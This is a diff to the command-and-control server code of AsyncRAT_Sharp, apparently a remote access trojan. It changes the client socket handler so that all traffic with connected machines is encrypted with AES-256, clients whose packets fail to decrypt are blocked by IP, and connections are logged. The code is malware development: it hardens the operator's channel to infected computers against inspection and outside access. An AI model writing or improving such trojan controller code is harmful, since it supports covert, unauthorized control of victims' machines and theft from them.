@@ -5,6 +5,8 @@ using System.Net.Sockets;
 using System.Windows.Forms;
 using AsyncRAT_Sharp.Handle_Packet;
 using System.Threading.Tasks;
+using System.Security.Cryptography;
+using System.Drawing;
 
 namespace AsyncRAT_Sharp.Sockets
 {
@@ -21,6 +23,15 @@ namespace AsyncRAT_Sharp.Sockets
 
         public Clients(Socket CLIENT)
         {
+            if (Settings.Blocked.Contains(CLIENT.RemoteEndPoint.ToString().Split(':')[0]))
+            {
+                Disconnected();
+                return;
+            }
+            else
+                HandleLogs.Addmsg($"Client {CLIENT.RemoteEndPoint.ToString().Split(':')[0]} connected successfully", Color.Green);
+
+
             Client = CLIENT;
             Buffer = new byte[1];
             Buffersize = 0;
@@ -66,7 +77,18 @@ namespace AsyncRAT_Sharp.Sockets
                             {
                                 await Task.Run(() =>
                                 {
-                                    HandlePacket.Read(this, MS.ToArray());
+                                    try
+                                    {
+                                        HandlePacket.Read(this, Settings.aes256.Decrypt(MS.ToArray()));
+
+                                    }
+                                    catch (CryptographicException)
+                                    {
+                                        HandleLogs.Addmsg($"Client {Client.RemoteEndPoint.ToString().Split(':')[0]} tried to connect with wrong password, IP blocked", Color.Red);
+                                        Settings.Blocked.Add(Client.RemoteEndPoint.ToString().Split(':')[0]);
+                                        Disconnected();
+                                        return;
+                                    }
                                     Settings.Received += MS.ToArray().Length;
                                     Buffer = new byte[1];
                                     Buffersize = 0;
@@ -129,7 +151,7 @@ namespace AsyncRAT_Sharp.Sockets
                 {
                     using (MemoryStream MEM = new MemoryStream())
                     {
-                        byte[] buffer = (byte[])Msgs;
+                        byte[] buffer = Settings.aes256.Encrypt((byte[])Msgs);
                         byte[] buffersize = Encoding.UTF8.GetBytes(buffer.Length.ToString() + (char)0);
                         MEM.WriteAsync(buffersize, 0, buffersize.Length);
                         MEM.WriteAsync(buffer, 0, buffer.Length);
